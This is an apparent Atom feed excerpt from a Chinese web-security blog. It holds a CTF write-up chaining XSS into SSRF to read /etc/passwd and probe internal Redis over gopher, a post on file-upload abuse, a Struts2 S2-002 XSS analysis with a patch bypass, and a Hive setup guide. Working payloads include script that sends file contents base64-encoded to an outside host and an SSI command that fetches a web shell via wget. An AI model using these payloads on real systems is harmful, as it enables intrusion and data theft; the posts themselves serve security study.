class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attr">src="x"onerror="</span></span><br><span class="line"><span class="attr">xmlhttp</span> = new XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="attr">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        document.<span class="attr">location</span> = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"url=file:///etc/passwd"</span>);</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现可以获取到<code>/etc/passwd</code><br><img src="https://i.loli.net/2019/05/02/5ccaf3ca9a921.png" alt><br>至此已经可以任意文件读取了，这是一道ctf题目，在robots.txt中提示让读取<code>config.php</code><br><img src="https://i.loli.net/2019/05/02/5ccaf46a09ad6.png" alt><br>那么我们便可以继续修改上面的payload读取config.php。<br><img src="https://i.loli.net/2019/05/02/5ccaf6a42d22d.png" alt><br>进一步获取到在内网<code>25566</code>端口运行着<code>redis</code><br>那么便可以通过<code>gopher</code>协议去攻击内网redis了。</p><h2 id="0X04-xssrf-gopher协议攻击内网redis"><a href="#0X04-xssrf-gopher协议攻击内网redis" class="headerlink" title="0X04 xssrf gopher协议攻击内网redis"></a>0X04 xssrf gopher协议攻击内网redis</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attr">src="x"onerror="</span></span><br><span class="line"><span class="attr">xmlhttp</span> = new XMLHttpRequest();</span><br><span class="line">xmlhttp.<span class="attr">onreadystatechange=function()&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="attr">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="attr">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        document.<span class="attr">location</span> = 'http://zhengbao.wang?'+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"request.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"url=gopher://127.0.0.1:25566/_info%250a_quit"</span>);</span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure><p>成功获得redis info信息。<br><img src="https://i.loli.net/2019/05/03/5ccbb184d23dd.png" alt></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/" target="_blank" rel="noopener">https://skysec.top/2018/08/17/xss-ssrf-redis/</a><br><a href="https://www.kingkk.com/2018/08/redis未授权访问与ssrf利用" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/redis未授权访问与ssrf利用</a><br><a href="https://www.cnblogs.com/go2bed/p/4136358.html" target="_blank" rel="noopener">https://www.cnblogs.com/go2bed/p/4136358.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;0X00 前言&lt;/h2&gt;&lt;p&gt;由于本菜鸡对xss的认识还停留在弹个框框的层面上，写此文章以求进步。&lt;/p&gt;
&lt;p&gt;在实际过程中经常
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="https://zhengbao.wang/tags/xss/"/>
    
      <category term="ssrf" scheme="https://zhengbao.wang/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>文件上传功能的一些另类利用</title>
    <link href="https://zhengbao.wang/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%A6%E7%B1%BB%E5%88%A9%E7%94%A8/"/>
    <id>https://zhengbao.wang/文件上传功能的一些另类利用/</id>
    <published>2019-04-20T15:35:16.000Z</published>
    <updated>2019-04-20T15:36:40.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了解析。那么在这种情况下如何去挖掘上传点的其他一些利用方式呢，下面看一下大佬们的其他骚操作。</p><h2 id="0x01-XSS"><a href="#0x01-XSS" class="headerlink" title="0x01 XSS"></a>0x01 XSS</h2><p>关于利用文件上传的XSS,早在16年大佬就给出了多种利用方式：<a href="http://brutelogic.com.br/blog/file-upload-xss/" target="_blank" rel="noopener">File Upload XSS</a></p><h3 id="文件名xss"><a href="#文件名xss" class="headerlink" title="文件名xss"></a>文件名xss</h3><p>windows下文件名不能包含 <code>/ \ : * ? “ &lt; &gt; |</code> 字符，而linux下是可以出现除 <code>/</code> 字符之外的其它所有的字符，而且在Linux系统中可以使用长文件或目录名，直接利用这个特性，在上传点没有对文件名进行检测和处理的情况下就可以实现XSS攻击。</p><h3 id="svg文件"><a href="#svg文件" class="headerlink" title="svg文件"></a>svg文件</h3><p>svg它的英文全称为Scalable Vector Graphics，意思为可缩放的矢量图形，是一种图片文件格式。当服务端允许上传svg类型的文件时，可进行Xss。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg <span class="attribute">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attribute">onload</span>=<span class="string">"alert("</span>svg-xss")/&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/20/5cbb33464fbca.png" alt></p><h2 id="0x02-SSI-Injection"><a href="#0x02-SSI-Injection" class="headerlink" title="0x02 SSI Injection"></a>0x02 SSI Injection</h2><p>SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。<br>详细参考<a href="https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection</a></p><p>也就说一个web服务如果开启了SSI功能，即可通过上传<code>shtml</code>进行文件读取甚至命令执行。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">Linux:</span><br><span class="line"></span><br><span class="line">List files <span class="keyword">of</span> directory:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="ls" --&gt;</span><br><span class="line">Access directories:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="cd /root/dir/"&gt;</span><br><span class="line">Execution script:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;</span><br><span class="line">Windows:</span><br><span class="line"></span><br><span class="line">List files <span class="keyword">of</span> directory:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="dir" --&gt;</span><br><span class="line">Access directories:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="cd C:\admin\dir"&gt;</span><br></pre></td></tr></table></figure></p><h2 id="0X03-SSRF"><a href="#0X03-SSRF" class="headerlink" title="0X03 SSRF"></a>0X03 SSRF</h2><p>参考<a href="https://nosec.org/home/detail/2305.html" target="_blank" rel="noopener">利用SVG图片和SSRF收集服务器内部信息</a><br>该利用同样需要支持上传<code>svg</code>文件，由于它是xml结构，所以支持各种xml特性，其中一个特性是XLink，支持在xml文档中创建内部或外部的超链接。<br>上传<code>ssrf.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns:svg</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"200"</span>&gt;</span><span class="tag">&lt;<span class="name">image</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">xlink:href</span>=<span class="string">"http://192.168.111.149:3000/?ssrfsvg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/20/5cbb3846adbf8.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="https://zhengbao.wang/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计入门之s2-002复现分析</title>
    <link href="https://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-002%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://zhengbao.wang/java代码审计入门之s2-002复现分析/</id>
    <published>2019-04-17T04:25:20.000Z</published>
    <updated>2019-04-17T08:30:01.754Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>入门JAVA代码审计的第二篇文章，复现分析<code>S2-002</code> xss漏洞。</p><p>本篇在漏洞分析的基础上，重点追踪了struts2标签解析过程。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>官方公告中给出的漏洞影响版本为Struts 2.0.0 - Struts 2.0.11，因此本环境可以在之前分析<code>s1-001</code>漏洞环境上搭建，可参考前面的文章<a href="https://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">java代码审计入门之s2-001复现分析</a></p><p>在上面环境的基础上，继续创建<code>xss_test.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-002<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;s:url action="</span><span class="attr">Xss</span>" <span class="attr">includeParams</span>=<span class="string">"all"</span> &gt;</span><span class="tag">&lt;/<span class="name">s:url</span>&gt;</span>"&gt;你好Struts2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>创建<code>Xss.java</code> class<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.<span class="type">ActionSupport</span>;</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Xss</span>  <span class="keyword">extends</span> <span class="title">ActionSupport</span></span>&#123;</span><br><span class="line">    public <span class="type">String</span> execute() <span class="keyword">throws</span> <span class="type">Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="type">SUCCESS</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>struct.xml</code>中添加<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;action <span class="built_in">name</span>=<span class="string">"Xss"</span> <span class="built_in">class</span>=<span class="string">"com.demo.action.Xss"</span>&gt;</span><br><span class="line">        &lt;<span class="literal">result</span> <span class="built_in">name</span>=<span class="string">"success"</span>&gt;xss_test.jsp&lt;/<span class="literal">result</span>&gt;</span><br><span class="line">&lt;/action&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb5e4019070d.png" alt></p><h2 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h2><p>首先看一下官方关于漏洞的描述<br><img src="https://i.loli.net/2019/04/16/5cb5e6016f1be.png" alt><br>可以看到漏洞主要原因是Struts 2框架在处理<code>&lt;s:url&gt;</code> 和<code>&lt;s:a&gt;</code>标签时，未对标签内的字符进行转义，导致XSS漏洞。<br>在我们搭建的Demo中，以<code>&lt;s:url&gt;</code>标签为例进行分析<br>这里需要说明的是struts2允许使用自定义的其自定义的标签，如上面的<code>&lt;s:url&gt;</code>即为struct2 url标签。在使用struts2标签时需在页面中添加<code>&lt;%@ taglib uri =&quot;/struts-tags&quot; prefix =&quot;s&quot; %&gt;</code>。引入标签配置。该配置在<code>struts2-core</code>核心jar包中,<code>META-INF/struts-tags.tld</code>对struts2标签进行了定义。<br>比如我们本次使用的<code>&lt;s:url&gt;</code><br><img src="https://i.loli.net/2019/04/17/5cb6999ce1263.png" alt><br><code>&lt;tag-class&gt;org.apache.struts2.views.jsp.URLTag&lt;/tag-class&gt;</code>说明了标签的具体实现类为<code>org.apache.struts2.views.jsp.URLTag</code><br><img src="https://i.loli.net/2019/04/17/5cb69a62d7947.png" alt><br>在本例中<code>&lt;s:url&gt;</code>标签在<code>xss_test.jps</code>中，jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，当struts2在解析到标签时，实际上是继承了http servlet中可扩展的BodyTagSupport类。<br>然后依次执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">doStartTag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">setBodyContent</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">doInitBody</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">doAfterBody</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">doEndTag</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p><p>我们从<code>doStartTag</code>方法下断开始跟踪。<br>使用payload访问<code>localhost:8080/test_war_exploded/Xss.action?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;=boogle</code><br><img src="https://i.loli.net/2019/04/17/5cb693baf10db.png" alt><br>在<code>doStartTag</code>方法中通过<code>gettBean()</code>方法获取URL组件,然后通过<code>populateParams()</code>方法对获取的URL组件中属性进行赋值。<br>然后执行<code>this.component.start(this.pageContext.getOut())</code>方法，即前面提到的<code>URL</code>组件的start方法。<br>跟进该方法<br><img src="https://i.loli.net/2019/04/17/5cb69cedead85.png" alt><br>首先会判断<code>&lt;s:url&gt;</code>标签中设置的<code>includeParams</code>参数，该属性有三个值：<code>none</code> <code>get</code> <code>all</code>，默认值为get。属性值为get时，该url会将访问其所在jsp的的请求的所有get方法的参数添加到自身来 ，属性值为all时更是将get和post的的参数值全部添加到自身来，属性值为none时不添加。<br>本例中我们设置的参数值为<code>all</code>，之后便进入到<code>includeParams</code>值为<code>all</code>的流程，执行<code>mergeRequestParameters</code>方法。<br>跟进<br><img src="https://i.loli.net/2019/04/17/5cb69f9785c27.png" alt><br>在该方法中取到我们的payload，并保存在<code>parameters</code>中。<br>然后回到URL组件的<code>start</code>方法中，继续执行进入到<code>includeGetParameters</code>方法。<br><img src="https://i.loli.net/2019/04/17/5cb6a10e054a2.png" alt><br>该方法中使用<code>extractQueryString</code>方法获得参数信息，该方法会直接调用<code>HttpServletRequest</code>的<code>getQueryString</code>的方法直接获取浏览器发送的请求信息。<br>之后又调用<code>UrlHelper.parseQueryString(query)</code>以<code>&amp;</code>为分隔符将获取的请求信息分隔出不同的参数。将参数保存在<code>queryParams</code><br><img src="https://i.loli.net/2019/04/17/5cb6a41aafcce.png" alt><br>在该过程中会对参数的value值使用<code>translateAndDecode</code>编码处理，而不会对参数name进行任何处理。<br>然后继续执行进入<code>mergeRequestParameters</code>将参数名称和值保存到<code>parameters</code>中。<br>至此<code>doStartTag</code>工作完成，然后进入到<code>doEndTag</code>方法<br><img src="https://i.loli.net/2019/04/17/5cb6a5dcce68a.png" alt><br>然后进入<code>end</code>方法，实现对标签的内容渲染工作。<br><img src="https://i.loli.net/2019/04/17/5cb6a836a26eb.png" alt></p><h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">if</span> the action was <span class="keyword">not</span> explicitly <span class="built_in">set</span> grab the params <span class="keyword">from</span> the request</span><br><span class="line">        <span class="keyword">if</span> (escapeAmp) &#123;</span><br><span class="line">            buildParametersString(params, link);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            buildParametersString(params, link, <span class="string">"&amp;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="literal">result</span> = link.toString();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">result</span>.indexOf(<span class="string">"&lt;script&gt;"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="literal">result</span> = <span class="literal">result</span>.replaceAll(<span class="string">"&lt;script&gt;"</span>, <span class="string">"script"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="literal">result</span> = encodeResult ? response.encodeURL(<span class="literal">result</span>) : <span class="literal">result</span>;</span><br><span class="line">        &#125; catch (<span class="type">Exception</span> ex) &#123;</span><br><span class="line">            // <span class="type">Could</span> <span class="keyword">not</span> encode the <span class="type">URL</span> <span class="keyword">for</span> some reason</span><br><span class="line">            // <span class="type">Use</span> it unchanged</span><br><span class="line">            <span class="literal">result</span> = link.toString();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>补丁使用<code>while</code>循环对<code>&lt;script&gt;</code>进行去除，仍可使用<code>&lt;script boogle&gt;</code>样式绕过。<br>payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">boogle</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>=boogle</span><br></pre></td></tr></table></figure></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04  参考"></a>0x04  参考</h2><p><a href="https://www.angelwhu.com/blog/?p=312" target="_blank" rel="noopener">Struts2标签原理分析</a><br><a href="https://www.iflym.com/index.php/code/resolve-error-codec-problem-while-use-s-url-or-s-a-on-struts2.html" target="_blank" rel="noopener">https://www.iflym.com/index.php/code/resolve-error-codec-problem-while-use-s-url-or-s-a-on-struts2.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;入门JAVA代码审计的第二篇文章，复现分析&lt;code&gt;S2-002&lt;/code&gt; xss漏洞。&lt;/p
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="https://zhengbao.wang/tags/java/"/>
    
      <category term="struts2" scheme="https://zhengbao.wang/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>Centos7配置安装HIVE</title>
    <link href="https://zhengbao.wang/Centos7%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85HIVE/"/>
    <id>https://zhengbao.wang/Centos7配置安装HIVE/</id>
    <published>2019-04-17T02:00:30.000Z</published>
    <updated>2019-04-17T02:01:38.533Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自<a href="https://www.yiibai.com/hive/" target="_blank" rel="noopener">https://www.yiibai.com/hive/</a></p><p>本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考<a href="https://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a></p><h2 id="0x01-配置安装HIVE"><a href="#0x01-配置安装HIVE" class="headerlink" title="0x01 配置安装HIVE"></a>0x01 配置安装HIVE</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>首先<a href="http://www.apache.org/dyn/closer.cgi/hive/" target="_blank" rel="noopener">下载HIVE</a>,为了与Hadoop3.2.0,我选择的hive版本为3.1.1</p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>下载完成后进行解压，根据解压目录自行配置环境变量<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="selector-class">.bashrc</span>   <span class="comment">//配置环境变量</span></span><br><span class="line">source <span class="selector-class">.bashrc</span>  <span class="comment">//使配置生效</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/17/5cb681dc428fd.png" alt></p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>移动到HIVE安装目录下的<code>conf</code>文件夹执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp hive-env<span class="selector-class">.sh</span><span class="selector-class">.template</span> hive-env<span class="selector-class">.sh</span> </span><br><span class="line"></span><br><span class="line">cp hive-default<span class="selector-class">.xml</span><span class="selector-class">.template</span> hive-site<span class="selector-class">.xml</span> </span><br><span class="line"></span><br><span class="line">cp hive-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-log4j2<span class="selector-class">.properties</span> </span><br><span class="line"></span><br><span class="line">cp hive-exec-log4j2<span class="selector-class">.properties</span><span class="selector-class">.template</span> hive-exec-log4j2.properties</span><br></pre></td></tr></table></figure></p><p>修改hive-env.sh,添加JAVA_HOME,HADOOP_HOME及HIVE配置文件目录，请根据自己环境自行修改如下<br><img src="https://i.loli.net/2019/04/17/5cb682abe5216.png" alt></p><h3 id="Schema初始化"><a href="#Schema初始化" class="headerlink" title="Schema初始化"></a>Schema初始化</h3><p>执行<code>schematool -initSchema -dbType derby</code><br>执行成功效果如下<br><img src="https://i.loli.net/2019/04/17/5cb68361a0619.png" alt><br>如果执行failed，修改<code>hive-3.1.1/scripts/metastore/upgrade/derby</code>目录下的<code>hive-schema-2.1.0.derby.sql</code><br>按下图将框中内容使用注释符<code>--</code>注释<br><img src="https://i.loli.net/2019/04/17/5cb68443d23f9.png" alt><br>重新执行<code>schematool -initSchema -dbType derby</code></p><h3 id="启动HIVE"><a href="#启动HIVE" class="headerlink" title="启动HIVE"></a>启动HIVE</h3><p>Schema初始化成功后即可启动hive，命令<code>hive</code><br>启动成功如下，如出现报错，请移至文末<code>0x03 问题解决</code>查看笔者记录部分问题解决方法<br><img src="https://i.loli.net/2019/04/17/5cb68865ee29e.png" alt></p><h2 id="0x02-HIVE命令"><a href="#0x02-HIVE命令" class="headerlink" title="0x02 HIVE命令"></a>0x02 HIVE命令</h2><p><img src="https://i.loli.net/2019/04/17/5cb6889618cb6.png" alt><br>详细命令参考<a href="https://www.jianshu.com/p/b1fafc1bdb03" target="_blank" rel="noopener">Hive常用命令</a></p><h2 id="0x03-问题解决"><a href="#0x03-问题解决" class="headerlink" title="0x03 问题解决"></a>0x03 问题解决</h2><h3 id="expansion-character问题"><a href="#expansion-character问题" class="headerlink" title="expansion character问题"></a>expansion character问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6858693bc8.png" alt><br>解决方法：修改报错的<code>hive-site.xml</code>,将报错位置<code>3210</code>行第96个字符删掉</p><h3 id="system-xxx-路径错误问题"><a href="#system-xxx-路径错误问题" class="headerlink" title="${system:xxx}路径错误问题"></a>${system:xxx}路径错误问题</h3><p><img src="https://i.loli.net/2019/04/17/5cb6869fbfe64.png" alt><br>出现该问题的主要原因是hive配置文件中不能使用冒号目录定义方法，可将其直接修改为目录。<br>如配置文件中用<code>${system:java.io.tmpdir}</code>定义的路径改为<code>/tmp/</code>,<code>${system:user.name}</code>定义的路径改为<code>${user.name}</code>，其他类似<br>可使用<code>cat -n hive-site.xml |grep system:</code>定位到出现问题的位置<br><img src="https://i.loli.net/2019/04/17/5cb687a138126.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
